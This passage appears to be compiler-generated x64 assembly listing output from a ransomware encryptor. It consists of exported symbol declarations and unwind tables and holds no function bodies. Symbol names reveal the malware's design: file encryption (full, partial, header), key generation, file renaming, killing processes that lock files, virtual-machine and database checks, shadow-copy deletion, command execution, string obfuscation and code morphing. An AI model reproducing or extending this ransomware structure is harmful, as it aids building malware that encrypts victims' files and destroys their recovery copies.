__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::decrypt
PUBLIC	?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z	; cryptor::CloseFile
PUBLIC	?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z	; cryptor::Encrypt
PUBLIC	?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ; EncryptFull
PUBLIC	?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z ; EncryptPartly
PUBLIC	?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ; EncryptHeader
PUBLIC	?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z	; OpenFileEncrypt
PUBLIC	?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z ; WriteEncryptInfo
PUBLIC	?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z	; GenKey
PUBLIC	?ChangeFileName@cryptor@@YAHPEB_W@Z		; cryptor::ChangeFileName
PUBLIC	?KillFileOwner@@YAHPEB_W@Z			; KillFileOwner
PUBLIC	?WriteFullData@@YAHPEAX0K@Z			; WriteFullData
PUBLIC	?CheckForVirtualMachines@@YAHPEB_W@Z		; CheckForVirtualMachines
PUBLIC	?CheckForDataBases@@YAHPEB_W@Z			; CheckForDataBases
PUBLIC	?DeleteShadowCopies@cryptor@@YAFPEAX@Z		; cryptor::DeleteShadowCopies
PUBLIC	?CmdExecW@@YAXPEB_W@Z				; CmdExecW
PUBLIC	?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z ; cryptor::SetWhiteListProcess
PUBLIC	?morphcode@@YAXXZ				; morphcode
PUBLIC	?pVariantClear@@YAJPEAUtagVARIANT@@@Z		; pVariantClear
PUBLIC	?pVariantInit@@YAXPEAUtagVARIANT@@@Z		; pVariantInit
PUBLIC	?pSysAllocString@@YAPEA_WPEB_W@Z		; pSysAllocString
PUBLIC	?pStrStrIW@@YAPEB_WPEB_W0@Z			; pStrStrIW
PUBLIC	?pCoInitializeEx@@YAJPEAXK@Z			; pCoInitializeEx
PUBLIC	?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z ; pCoInitializeSecurity
PUBLIC	?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z ; pCoSetProxyBlanket
PUBLIC	?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z ; pCoCreateInstance
PUBLIC	?pCoUninitialize@@YAXXZ				; pCoUninitialize
PUBLIC	?pRmShutdown@@YAKKKP6AXI@Z@Z			; pRmShutdown
PUBLIC	?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z ; pRmRegisterResources
PUBLIC	?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z ; pRmGetList
PUBLIC	?pRmStartSession@@YAKPEAKKPEA_W@Z		; pRmStartSession
PUBLIC	?pRmEndSession@@YAKK@Z				; pRmEndSession
PUBLIC	?pCryptGenRandom@@YAH_KKPEAE@Z			; pCryptGenRandom
PUBLIC	?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z		; pCryptEncrypt
PUBLIC	?pMoveFileW@@YAHPEB_W0@Z			; pMoveFileW
PUBLIC	?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z			; plstrcpyW
PUBLIC	?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z ; pCreateProcessW
PUBLIC	?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z ; pSetFilePointerEx
PUBLIC	?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z	; pGetNativeSystemInfo
PUBLIC	?plstrcatW@@YAPEA_WPEA_WPEB_W@Z			; plstrcatW
PUBLIC	?pGetLastError@@YAKXZ				; pGetLastError
PUBLIC	?pWow64RevertWow64FsRedirection@@YAHPEAX@Z	; pWow64RevertWow64FsRedirection
PUBLIC	?pSetFileAttributesW@@YAHPEB_WK@Z		; pSetFileAttributesW
PUBLIC	?pGetFileAttributesW@@YAKPEB_W@Z		; pGetFileAttributesW
PUBLIC	?pWaitForSingleObject@@YAKPEAXK@Z		; pWaitForSingleObject
PUBLIC	?pSetEndOfFile@@YAHPEAX@Z			; pSetEndOfFile
PUBLIC	?pGetProcessId@@YAKPEAX@Z			; pGetProcessId
PUBLIC	?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z	; pWow64DisableWow64FsRedirection
PUBLIC	?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z ; pWriteFile
PUBLIC	?pGetCurrentProcess@@YAPEAXXZ			; pGetCurrentProcess
PUBLIC	?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z	; pReadFile
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z DD imagerel $LN14
	DD	imagerel $LN14+105
	DD	imagerel $unwind$?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z DD imagerel $LN2936
	DD	imagerel $LN2936+941
	DD	imagerel $unwind$?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD imagerel $LN289
	DD	imagerel $LN289+60
	DD	imagerel $unwind$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD imagerel $LN289+60
	DD	imagerel $LN289+1222
	DD	imagerel $chain$2$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD imagerel $LN289+1222
	DD	imagerel $LN289+1255
	DD	imagerel $chain$3$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD imagerel $LN1649
	DD	imagerel $LN1649+5168
	DD	imagerel $unwind$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD imagerel $LN1649+5168
	DD	imagerel $LN1649+7235
	DD	imagerel $chain$3$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD imagerel $LN1649+7235
	DD	imagerel $LN1649+7383
	DD	imagerel $chain$4$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD imagerel $LN439
	DD	imagerel $LN439+1782
	DD	imagerel $unwind$?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z DD imagerel $LN1360
	DD	imagerel $LN1360+4023
	DD	imagerel $unwind$?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z DD imagerel $LN887
	DD	imagerel $LN887+2757
	DD	imagerel $unwind$?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD imagerel $LN274
	DD	imagerel $LN274+542
	DD	imagerel $unwind$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD imagerel $LN274+542
	DD	imagerel $LN274+1144
	DD	imagerel $chain$1$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD imagerel $LN274+1144
	DD	imagerel $LN274+1180
	DD	imagerel $chain$2$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ChangeFileName@cryptor@@YAHPEB_W@Z DD imagerel $LN175
	DD	imagerel $LN175+732
	DD	imagerel $unwind$?ChangeFileName@cryptor@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?KillFileOwner@@YAHPEB_W@Z DD imagerel $LN217
	DD	imagerel $LN217+453
	DD	imagerel $unwind$?KillFileOwner@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?KillFileOwner@@YAHPEB_W@Z DD imagerel $LN217+453
	DD	imagerel $LN217+974
	DD	imagerel $chain$1$?KillFileOwner@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?KillFileOwner@@YAHPEB_W@Z DD imagerel $LN217+974
	DD	imagerel $LN217+1003
	DD	imagerel $chain$2$?KillFileOwner@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?KillFileOwner@@YAHPEB_W@Z DD imagerel $LN217+1003
	DD	imagerel $LN217+1044
	DD	imagerel $chain$3$?KillFileOwner@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?WriteFullData@@YAHPEAX0K@Z DD imagerel $LN222
	DD	imagerel $LN222+937
	DD	imagerel $unwind$?WriteFullData@@YAHPEAX0K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckForVirtualMachines@@YAHPEB_W@Z DD imagerel $LN914
	DD	imagerel $LN914+3701
	DD	imagerel $unwind$?CheckForVirtualMachines@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckForDataBases@@YAHPEB_W@Z DD imagerel $LN5752
	DD	imagerel $LN5752+18237
	DD	imagerel $unwind$?CheckForDataBases@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686
	DD	imagerel $LN1686+97
	DD	imagerel $unwind$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686+97
	DD	imagerel $LN1686+532
	DD	imagerel $chain$0$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686+532
	DD	imagerel $LN1686+1099
	DD	imagerel $chain$1$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686+1099
	DD	imagerel $LN1686+6055
	DD	imagerel $chain$2$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686+6055
	DD	imagerel $LN1686+6071
	DD	imagerel $chain$3$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD imagerel $LN1686+6071
	DD	imagerel $LN1686+6097
	DD	imagerel $chain$4$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CmdExecW@@YAXPEB_W@Z DD imagerel $LN334
	DD	imagerel $LN334+1495
	DD	imagerel $unwind$?CmdExecW@@YAXPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pVariantClear@@YAJPEAUtagVARIANT@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pVariantClear@@YAJPEAUtagVARIANT@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pVariantInit@@YAXPEAUtagVARIANT@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pVariantInit@@YAXPEAUtagVARIANT@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSysAllocString@@YAPEA_WPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pSysAllocString@@YAPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pStrStrIW@@YAPEB_WPEB_W0@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pStrStrIW@@YAPEB_WPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCoInitializeEx@@YAJPEAXK@Z DD imagerel $LN4
	DD	imagerel $LN4+35
	DD	imagerel $unwind$?pCoInitializeEx@@YAJPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z DD imagerel $LN4
	DD	imagerel $LN4+83
	DD	imagerel $unwind$?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+66
	DD	imagerel $unwind$?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCoUninitialize@@YAXXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pCoUninitialize@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pRmShutdown@@YAKKKP6AXI@Z@Z DD imagerel $LN4
	DD	imagerel $LN4+45
	DD	imagerel $unwind$?pRmShutdown@@YAKKKP6AXI@Z@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z DD imagerel $LN4
	DD	imagerel $LN4+78
	DD	imagerel $unwind$?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z DD imagerel $LN4
	DD	imagerel $LN4+85
	DD	imagerel $unwind$?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pRmStartSession@@YAKPEAKKPEA_W@Z DD imagerel $LN4
	DD	imagerel $LN4+57
	DD	imagerel $unwind$?pRmStartSession@@YAKPEAKKPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pRmEndSession@@YAKK@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pRmEndSession@@YAKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptGenRandom@@YAH_KKPEAE@Z DD imagerel $LN4
	DD	imagerel $LN4+69
	DD	imagerel $unwind$?pCryptGenRandom@@YAH_KKPEAE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z DD imagerel $LN4
	DD	imagerel $LN4+65
	DD	imagerel $unwind$?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pMoveFileW@@YAHPEB_W0@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pMoveFileW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DD imagerel $LN4
	DD	imagerel $LN4+90
	DD	imagerel $unwind$?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z DD imagerel $LN4
	DD	imagerel $LN4+74
	DD	imagerel $unwind$?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetLastError@@YAKXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pGetLastError@@YAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWow64RevertWow64FsRedirection@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pWow64RevertWow64FsRedirection@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSetFileAttributesW@@YAHPEB_WK@Z DD imagerel $LN4
	DD	imagerel $LN4+53
	DD	imagerel $unwind$?pSetFileAttributesW@@YAHPEB_WK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetFileAttributesW@@YAKPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pGetFileAttributesW@@YAKPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWaitForSingleObject@@YAKPEAXK@Z DD imagerel $LN4
	DD	imagerel $LN4+53
	DD	imagerel $unwind$?pWaitForSingleObject@@YAKPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSetEndOfFile@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pSetEndOfFile@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetProcessId@@YAKPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pGetProcessId@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z DD imagerel $LN4
	DD	imagerel $LN4+96
	DD	imagerel $unwind$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetCurrentProcess@@YAPEAXXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pGetCurrentProcess@@YAPEAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z DD imagerel $LN4
	DD	imagerel $LN4+96
	DD	imagerel $unwind$?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z DD 081401H
	DD	0a6414H
	DD	095414H
	DD	083414H
	DD	070105214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetCurrentProcess@@YAPEAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z DD 081401H
	DD	0a6414H
	DD	095414H
	DD	083414H
	DD	070105214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetProcessId@@YAKPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSetEndOfFile@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWaitForSingleObject@@YAKPEAXK@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetFileAttributesW@@YAKPEB_W@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSetFileAttributesW@@YAHPEB_WK@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWow64RevertWow64FsRedirection@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetLastError@@YAKXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z DD 060f01H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z DD 020601H
	DD	030029206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pMoveFileW@@YAHPEB_W0@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z DD 020601H
	DD	030027206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptGenRandom@@YAH_KKPEAE@Z DD 060f01H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pRmEndSession@@YAKK@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pRmStartSession@@YAKPEAKKPEA_W@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z DD 081401H
	DD	0a6414H
	DD	095414H
	DD	083414H
	DD	070105214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z DD 040a01H
	DD	0a340aH
	DD	07006720aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pRmShutdown@@YAKKKP6AXI@Z@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCoUninitialize@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z DD 040a01H
	DD	08340aH
	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z DD 020601H
	DD	030027206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z DD 010401H
	DD	0a204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCoInitializeEx@@YAJPEAXK@Z DD 010401H
	DD	04204H
xdata	ENDS
